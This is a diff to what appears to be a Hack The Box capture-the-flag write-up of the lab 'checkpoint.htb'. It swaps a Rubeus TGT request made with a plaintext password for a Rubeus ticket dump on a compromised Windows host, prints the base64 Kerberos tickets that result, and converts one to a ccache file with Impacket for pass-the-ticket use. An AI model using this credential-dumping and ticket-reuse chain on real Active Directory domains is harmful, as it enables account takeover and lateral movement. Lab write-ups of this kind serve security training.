@@ -1161,8 +1161,8 @@ PS C:\Users\ryan.brooks\Desktop>
 
 ``` bash
 
-PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe asktgt /user:alex.turner /password:'Checkpoint2024!' /domain:checkpoint.htb /dc:10.129.113.22 /enctype:AES256 /outfile:alex.kirbi /nowrap
-.\Rubeus.exe asktgt /user:alex.turner /password:'Checkpoint2024!' /domain:checkpoint.htb /dc:10.129.113.22 /enctype:AES256 /outfile:alex.kirbi /nowrap
+PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe dump /nowrap
+.\Rubeus.exe dump /nowrap
 
    ______        _
   (_____ \      | |
@@ -1173,31 +1173,67 @@ PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe asktgt /user:alex.turner /password
 
   v2.2.0
 
-[*] Action: Ask TGT
 
-[*] Using aes256_cts_hmac_sha1 hash: 8F12BA9591F2D80D1805E1C6476F9F236928F82C6063063D8D6EFFC8E5BF76E4
-[*] Building AS-REQ (w/ preauth) for: 'checkpoint.htb\alex.turner'
-[*] Using domain controller: 10.129.113.22:88
-[+] TGT request successful!
-[*] base64(ticket.kirbi):
+Action: Dump Kerberos Ticket Data (Current User)
 
-      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5jaGVja3BvaW50Lmh0YqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu1Yz9bo/31IG/4DeQINeBwZestUnnPC2WY3kmWEdv/QdIlJ+pjCCIHf+vmyUssV/mW8WSFRjj3J3zoCnh7mQwU77RW383ZA5JMVXMNlfNun1sW7fZ9zpbNYQ0OC/NiSEHsG8Jh1hpWY3VVkiHtLZ7lKSl/LFK1wTuVusbhHeNPP76ZYs34r+YPG1XiPHTfSabLo3CkVKbZplLJ7Rou8VwtTVV8aYflXdRdABzVnjWNyB/jB73zyu9ANe1sTZoT4Ien0V8AW27L2WtZiwuG776vyIZvNWO8L7MQ4HRX95cOeNgFFWLijvuqbdW1IbWg6N9FttJL4Sru3U2SwL/1N8XkgA4NxJoB0fFiqygP1D31wyo+43unl+7SAcNxM71o+c1A8IHPK0gJU197a5gBxZYx4hIv0OTWApOuiCo16JPj3Wh7yez7pEzp/eZ92EAXzHzBn2paawjYWiF2T278aGqAocQY3XXzsDhoDL1zV8xDlr0vgsQV4MeQIEg5gEr4R7rUcU7G49Phe6v+7ipVgNRiZIt4Yz9sEaKHof7xWHg89WL2g7ymfEWRx6T/ucxnuXMeSICdOtvdLyjUtMVjUJ+0QF4phIR/c8n4VE7BSjzfVKilXr5X3rUxoqNGg47bOVBtnFoDJdN+4SKFwCAIzuibBC2MpJaaCgZDZS5ghTVjMWPncavLF4ide6JNH0PORX384WlSrBN+/1d7vopiecPhOoSwR9C5VlabiGbpWx6p7MUH20bB7+W98l3zVlKqz+DcrN40lx83y64UahgCQA7aZZc32DfVTVrm9XbqanDKfWgeHDzs4gSyJfbkkWUR/QzIJyMEBLKr65Q75qBXNL2VQaC7+oeG7mGrL03FZCuZJgVJrZ5R9Ls+jHbNe6Dt7HHj9N11pYRz1KDZcVMa/71kpKUKWwkiwD5KNmXcECQ5gaWEu7v+VkrRZMl1YID+loYJFsuA1Da4y2oefxGu2jlcLkccehkuuKfcAKcM6XL1Xn4e+5W7CW29HYqCQJwK6kbzkqmHz094PZC7tEt9hKtBVHlr3Jw6BqA/xm0VaFLA4HVOxxD/lifCKfcsmT1jwKir6k01mlsEisev5fQLwFYTVAV8UJ8XnIFubF7cWXOIJKGsdkv9UcVvezjrMWnKrY4BviQDPsHkoYEWQ9AEEBN3PL3Ird8JOxxEaS7G/CtpuVxK2uCS7A5TFXvxwehznLjxOQq4tfGdfZ6HjRhU8VlOGVv8m/qIOs4bM8xWfSeHQbD8z0eDTTyoPcu5AyZgfRmq45w55hYzYCzv0EnbMvKVyqWGa8fpTZbKzi7qMXJQYYhgjY22Xs0fomB7jrEOC0fyvZmY6b53+aFdvJSvTj7jAdq1HbYwKCusXJKPrpqpb8HiaeJUX1YPFzmiFAsbXnrYBP/iec8Z5eoLN5etpzUlFtGeBcgL/+m/ATL6DxjPIT30doanzCXlhjPrvWsR3guo/g8y50EnDFtf6mf/2eQBQOBuKaYSZVWWe3RFUSZo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgStMOEWe19mLHvv+R0j4ftE+L3iIaUiaYSXZVIwkyaPShEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwthbGV4LnR1cm5lcqMHAwUAQOEAAKURGA8yMDI2MDgyOTA0MTk0M1qmERgPMjAyNjA4MjkxNDE5NDNapxEYDzIwMjYwOTA1MDQxOTQzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOY2hlY2twb2ludC5odGI=
+[*] Current LUID    : 0x6ee57
 
-Exception: C:\Users\ryan.brooks\Desktop\alex.kirbi already exists! Data not written to file.
+  UserName                 : ryan.brooks
+  Domain                   : CHECKPOINT
+  LogonId                  : 0x6ee57
+  UserSID                  : S-1-5-21-3129162710-3498938529-1807524340-1103
+  AuthenticationPackage    : Negotiate
+  LogonType                : Interactive
+  LogonTime                : 8/28/2026 7:12:08 PM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : CHECKPOINT.HTB
+  UserPrincipalName        : ryan.brooks@checkpoint.htb
 
 
-  ServiceName              :  krbtgt/checkpoint.htb
-  ServiceRealm             :  CHECKPOINT.HTB
-  UserName                 :  alex.turner
-  UserRealm                :  CHECKPOINT.HTB
-  StartTime                :  8/28/2026 9:19:43 PM
-  EndTime                  :  8/29/2026 7:19:43 AM
-  RenewTill                :  9/4/2026 9:19:43 PM
-  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
-  KeyType                  :  aes256_cts_hmac_sha1
-  Base64(key)              :  StMOEWe19mLHvv+R0j4ftE+L3iIaUiaYSXZVIwkyaPQ=
-  ASREP (key)              :  8F12BA9591F2D80D1805E1C6476F9F236928F82C6063063D8D6EFFC8E5BF76E4
+    ServiceName              :  krbtgt/CHECKPOINT.HTB
+    ServiceRealm             :  CHECKPOINT.HTB
+    UserName                 :  ryan.brooks
+    UserRealm                :  CHECKPOINT.HTB
+    StartTime                :  8/28/2026 9:31:08 PM
+    EndTime                  :  8/29/2026 7:31:08 AM
+    RenewTill                :  9/4/2026 9:31:08 PM
+    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+    Base64EncodedTicket   :
+
+      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRulh/4thkiF7SljAoZRig8QaUvp6noWyuChQ1XdaArQXmusm6+mRS6MUZ5/q48AGe0CmUCALNScgQrfvPVhXBKbzEdBsrwGzS/DYdHARlBUrC+R0Y7si+QhcRXcO7h1TaT0NtOihakgFWOwn1a7EBsmEbemBhdnNiKteZsOHJQ1YYN3GuLGkwwFxBiqOWPdb57NUR4J0zzNRFvUzbY5vWcANAMv97W9+CdO7XSa1TPD5OZMD84LUX7OP70XgevxmCDlAnB4i5h0gnkyPrTWhUxZNEgmHLBCj4QoUKam2Pc7eWqHqJbxvG8euNFvmEJ7pDrdxgYVS+N6+IRKN+yqi2nFAHp1bdp3jneiHbfyMeMTaNnSvVOXI90GjzJ19bFTHBMoHSHEHhTQYvCP8nB5bBxR0unGl0eAPvP/wtclvFLq/TX4m0jJB8NLMCjgVBDtK0F4tmi4gZE3ArpdTYGwbybeFhiYSsTlrRs3MVCS1l8RLOr5OC4yjU0wC53QtraPANf59OX+RdR8KSZOZTE2N4JRG4ACFf6QOXwNhH5M+R35gNtFUqhuCcBAqJ9/sJDLcOM6MC22srkq/PI3Bq7n8TYMP7hIuRRZU0K2GbtcUAGBfOVaRFYP7hjhCqkePf/IZyDj1D33rzPucnkjfpZqjHVAJQJfqRdOKFCW5tfgJM3dsU6r14Tyn9ppOTa0WiOXS3pMo2Isui2Mjb4UBZl3n5xadNNhWS4Cio8BgyRg+IuCSwS3J2GlPXcUe15zFa1ekQ6d1cfa0FhbwEu/dd1AJX/BZfEBUL8MzM4vqpn4qpA2RgTTU8/94E0JfckWCj9PxuEMnEr7dYC7FmnE/7jcy9KnMEgLzaiIlczKJYAa4UtKsCJ6ssfeCA1ga31SsSr1asD0pBPCS7ZezemMf6xPLriGsmWn7g/ozfVb8gn0Hz6dPzfWtWIkprdl98Y423sY9QQ8cuXbg98D1aXhkcwm+duHdcYmKMNn91kGQqNchrLvrx/oSCUltQCuP71ChjpjGIZa8d3CUiUbBZKmJ1nE1wOoYLq6VYLr2S0tChwCnO/EHVs+RFjb0Z4rhxObgpSPRD3hPnW8YJSbCItPfwDLCvoIFE2WmcHLNVLVjLDvqnGuVtL4nR1u0HAM34ULNmMhFQ2l2wgvTBgpIId3L/6uhFaqR5raIw2Ob+1l0IGHXxe5gBH02fKtKm3Kxdri95YP1Z4MVlzlfYzcLHl1nzhhCZhmIzawWB16ut8T2EZr9qMJ3aIdEzth7ZJAaS6e1DFMC8prZwNIGm/MsNdtDFD5j9Jbxo410d3MMfjjF8D0dpAXRl1hpD3/eN9W/ik5hK0UJpf0Ttks0u/+P+yAEU5sM9d0Cg/yhTUrOBXuGFQY9Jdspx61JlszCZFjzofFVyXYLGC3JeAZ6vU94geU6jRhZeMvAx/pOajuWW/lkJqd8n1yVNJ3yCSKZKtD1nW9t7e7uwSDoTLwhJ/iPPb//OE6FU+RHhUshWMOcGvv94Qrmi9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAQOEAAKURGA8yMDI2MDgyOTA0MzEwOFqmERgPMjAyNjA4MjkxNDMxMDhapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
+
+
+    ServiceName              :  HOST/dc01.checkpoint.htb
+    ServiceRealm             :  CHECKPOINT.HTB
+    UserName                 :  ryan.brooks
+    UserRealm                :  CHECKPOINT.HTB
+    StartTime                :  8/28/2026 9:31:08 PM
+    EndTime                  :  8/29/2026 7:31:08 AM
+    RenewTill                :  9/4/2026 9:31:08 PM
+    Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+    KeyType                  :  aes256_cts_hmac_sha1
+    Base64(key)              :  etA5OWQjFFiUW07opZ6IpFyRzAFV9WDR4AbchaYzUJA=
+    Base64EncodedTicket   :
+
+      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
 
 PS C:\Users\ryan.brooks\Desktop>
+
+```
+
+``` bash
+
+❯ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRulh/4thkiF7SljAoZRig8QaUvp6noWyuChQ1XdaArQXmusm6+mRS6MUZ5/q48AGe0CmUCALNScgQrfvPVhXBKbzEdBsrwGzS/DYdHARlBUrC+R0Y7si+QhcRXcO7h1TaT0NtOihakgFWOwn1a7EBsmEbemBhdnNiKteZsOHJQ1YYN3GuLGkwwFxBiqOWPdb57NUR4J0zzNRFvUzbY5vWcANAMv97W9+CdO7XSa1TPD5OZMD84LUX7OP70XgevxmCDlAnB4i5h0gnkyPrTWhUxZNEgmHLBCj4QoUKam2Pc7eWqHqJbxvG8euNFvmEJ7pDrdxgYVS+N6+IRKN+yqi2nFAHp1bdp3jneiHbfyMeMTaNnSvVOXI90GjzJ19bFTHBMoHSHEHhTQYvCP8nB5bBxR0unGl0eAPvP/wtclvFLq/TX4m0jJB8NLMCjgVBDtK0F4tmi4gZE3ArpdTYGwbybeFhiYSsTlrRs3MVCS1l8RLOr5OC4yjU0wC53QtraPANf59OX+RdR8KSZOZTE2N4JRG4ACFf6QOXwNhH5M+R35gNtFUqhuCcBAqJ9/sJDLcOM6MC22srkq/PI3Bq7n8TYMP7hIuRRZU0K2GbtcUAGBfOVaRFYP7hjhCqkePf/IZyDj1D33rzPucnkjfpZqjHVAJQJfqRdOKFCW5tfgJM3dsU6r14Tyn9ppOTa0WiOXS3pMo2Isui2Mjb4UBZl3n5xadNNhWS4Cio8BgyRg+IuCSwS3J2GlPXcUe15zFa1ekQ6d1cfa0FhbwEu/dd1AJX/BZfEBUL8MzM4vqpn4qpA2RgTTU8/94E0JfckWCj9PxuEMnEr7dYC7FmnE/7jcy9KnMEgLzaiIlczKJYAa4UtKsCJ6ssfeCA1ga31SsSr1asD0pBPCS7ZezemMf6xPLriGsmWn7g/ozfVb8gn0Hz6dPzfWtWIkprdl98Y423sY9QQ8cuXbg98D1aXhkcwm+duHdcYmKMNn91kGQqNchrLvrx/oSCUltQCuP71ChjpjGIZa8d3CUiUbBZKmJ1nE1wOoYLq6VYLr2S0tChwCnO/EHVs+RFjb0Z4rhxObgpSPRD3hPnW8YJSbCItPfwDLCvoIFE2WmcHLNVLVjLDvqnGuVtL4nR1u0HAM34ULNmMhFQ2l2wgvTBgpIId3L/6uhFaqR5raIw2Ob+1l0IGHXxe5gBH02fKtKm3Kxdri95YP1Z4MVlzlfYzcLHl1nzhhCZhmIzawWB16ut8T2EZr9qMJ3aIdEzth7ZJAaS6e1DFMC8prZwNIGm/MsNdtDFD5j9Jbxo410d3MMfjjF8D0dpAXRl1hpD3/eN9W/ik5hK0UJpf0Ttks0u/+P+yAEU5sM9d0Cg/yhTUrOBXuGFQY9Jdspx61JlszCZFjzofFVyXYLGC3JeAZ6vU94geU6jRhZeMvAx/pOajuWW/lkJqd8n1yVNJ3yCSKZKtD1nW9t7e7uwSDoTLwhJ/iPPb//OE6FU+RHhUshWMOcGvv94Qrmi9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAQOEAAKURGA8yMDI2MDgyOTA0MzEwOFqmERgPMjAyNjA4MjkxNDMxMDhapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" > ryan.b64
+❯ base64 -d ryan.b64 > ryan.kirbi
+❯ impacket-ticketConverter ryan.kirbi ryan.ccache
+Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies
+
+[*] converting kirbi to ccache...
+[+] done
+❯ export KRB5CCNAME=ryan.ccache
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
+╰─                                                                                                               ─╯
 
 ```
